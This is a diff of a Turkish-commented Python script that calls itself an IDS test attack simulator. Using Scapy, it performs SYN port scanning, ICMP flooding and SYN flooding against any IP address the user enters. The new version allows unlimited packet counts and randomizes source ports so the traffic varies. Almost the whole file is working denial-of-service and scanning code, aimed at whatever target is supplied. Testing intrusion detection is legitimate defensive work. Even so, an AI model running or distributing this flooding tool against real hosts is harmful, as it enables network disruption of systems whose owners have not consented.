@@ -1,91 +1,104 @@
-import socket
-import time
-import random
+# -*- coding: utf-8 -*-
+"""
+IDS TEST TOOL - SALDIRI SİMÜLATÖRÜ (PAKET SAYISI DESTEKLİ)
+"""
 import sys
-# Scapy kütüphanesi
-from scapy.all import IP, TCP, ICMP, send
+import threading
+import time
 
-def menu_yazdir():
-    print("\n" + "="*40)
-    print("   SALDIRI SİMÜLASYON ARACI")
-    print("="*40)
-    print("1. Port Tarama (Socket ile)")
-    print("2. SYN Flood Simülasyonu (Scapy ile)")
-    print("3. ICMP Flood Simülasyonu (Scapy ile)")
-    print("4. Çıkış")
-    print("="*40)
+try:
+    from scapy.all import IP, TCP, ICMP, send, RandShort
+except ImportError:
+    print("❌ Scapy bulunamadı! 'pip install scapy' yazarak yükleyin.")
+    sys.exit()
 
-def port_tarama(hedef_ip):
-    print(f"\n[*] {hedef_ip} taranıyor...")
-    portlar = [21, 22, 80, 443, 3306, 8080]
+def safe_send(pkt):
+    try:
+        send(pkt, verbose=False)
+    except:
+        pass
+
+def port_scan(target_ip):
+    try:
+        start_port = int(input("➤ Başlangıç Portu: "))
+        end_port = int(input("➤ Bitiş Portu: "))
+        print(f"🚀 {target_ip} üzerinde Tarama başlatıldı...")
+        
+        for port in range(start_port, end_port + 1):
+            pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
+            safe_send(pkt)
+            time.sleep(0.01)
+        print("✅ Tarama tamamlandı.")
+    except ValueError:
+        print("❌ Hatalı giriş!")
+
+def icmp_flood(target_ip):
+    try:
+        packet_limit = int(input("➤ Gönderilecek Paket Sayısı (Sınırsız için 0): "))
+        print(f"🔥 ICMP Flood başlatıldı... (Durdurmak için CTRL+C)")
+        
+        count = 0
+        while True:
+            pkt = IP(dst=target_ip) / ICMP()
+            safe_send(pkt)
+            count += 1
+            if packet_limit != 0 and count >= packet_limit:
+                break
+        print(f"✅ {count} paket gönderildi ve durduruldu.")
+    except KeyboardInterrupt:
+        print("\n🛑 İşlem kullanıcı tarafından durduruldu.")
+    except ValueError:
+        print("❌ Lütfen sayı girin!")
+
+def syn_flood(target_ip):
+    try:
+        port = int(input("➤ Hedef Port: "))
+        packet_limit = int(input("➤ Gönderilecek Paket Sayısı (Sınırsız için 0): "))
+        print(f"🌊 SYN Flood başlatıldı...")
+        
+        count = 0
+        while True:
+            # IDS'in her paketi farklı algılaması için rastgele kaynak portu
+            pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=port, flags="S")
+            safe_send(pkt)
+            count += 1
+            if packet_limit != 0 and count >= packet_limit:
+                break
+        print(f"✅ {count} paket gönderildi.")
+    except KeyboardInterrupt:
+        print("\n🛑 Durduruldu.")
+    except ValueError:
+        print("❌ Hatalı giriş!")
+
+def menu():
+    print(f"\n{'='*35}")
+    print("    IDS SALDIRI TEST SİMÜLATÖRÜ")
+    print(f"{'='*35}")
     
-    for port in portlar:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.1) # Hızlı tarama için süre kısa
-            sonuc = s.connect_ex((hedef_ip, port))
-            if sonuc == 0:
-                print(f"[+] Port {port}: AÇIK")
-            s.close()
-        except KeyboardInterrupt:
-            print("\n[!] Tarama durduruldu.")
+    target_ip = input("🎯 Hedef IP: ")
+    
+    while True:
+        print(f"\n[ Mevcut Hedef: {target_ip} ]")
+        print("1- Port Tarama")
+        print("2- ICMP Flood")
+        print("3- SYN Flood")
+        print("4- Hedef Değiştir")
+        print("0- Çıkış")
+        
+        secim = input("\n➤ Seçiminiz: ")
+        
+        if secim == "1":
+            port_scan(target_ip)
+        elif secim == "2":
+            icmp_flood(target_ip)
+        elif secim == "3":
+            syn_flood(target_ip)
+        elif secim == "4":
+            target_ip = input("🎯 Yeni Hedef IP: ")
+        elif secim == "0":
             break
-        except:
-            pass
-    print("[*] Tarama bitti.")
-
-def syn_flood_simulasyonu(hedef_ip):
-    print(f"\n[*] {hedef_ip} hedefine SYN Flood başlatılıyor...")
-    print("[!] Durdurmak için CTRL+C'ye basınız.")
-    time.sleep(1)
-    
-    try:
-        while True:
-            sahte_port = random.randint(1024, 65535)
-            # Sahte kaynak IP (IP Spoofing) yapmıyoruz çünkü dönen cevapları görmek isteyebiliriz,
-            # ama saldırı simülasyonu için normal IP yeterli.
-            
-            # 'S' bayrağı SYN anlamına gelir
-            pkt = IP(dst=hedef_ip)/TCP(sport=sahte_port, dport=80, flags="S")
-            send(pkt, verbose=0)
-            
-            # Çok hızlı gönderim için sleep süresini kıstık
-            time.sleep(0.01)
-            
-    except KeyboardInterrupt:
-        print("\n[*] Saldırı durduruldu.")
-
-def icmp_flood_simulasyonu(hedef_ip):
-    print(f"\n[*] {hedef_ip} hedefine ICMP (Ping) Flood başlatılıyor...")
-    print("[!] Durdurmak için CTRL+C'ye basınız.")
-    time.sleep(1)
-    
-    try:
-        while True:
-            pkt = IP(dst=hedef_ip)/ICMP()
-            send(pkt, verbose=0)
-            time.sleep(0.01)
-            
-    except KeyboardInterrupt:
-        print("\n[*] Saldırı durduruldu.")
+        else:
+            print("❌ Geçersiz seçim!")
 
 if __name__ == "__main__":
-    while True:
-        menu_yazdir()
-        secim = input("Seçiminiz: ")
-        
-        if secim == '4':
-            print("Güle güle...")
-            break
-        
-        if secim in ['1', '2', '3']:
-            hedef_ip = input("Hedef IP Adresi (Örn: 192.168.1.XX): ")
-            
-            if secim == '1':
-                port_tarama(hedef_ip)
-            elif secim == '2':
-                syn_flood_simulasyonu(hedef_ip)
-            elif secim == '3':
-                icmp_flood_simulasyonu(hedef_ip)
-        else:
-            print("[!] Geçersiz seçim.")
+    menu()
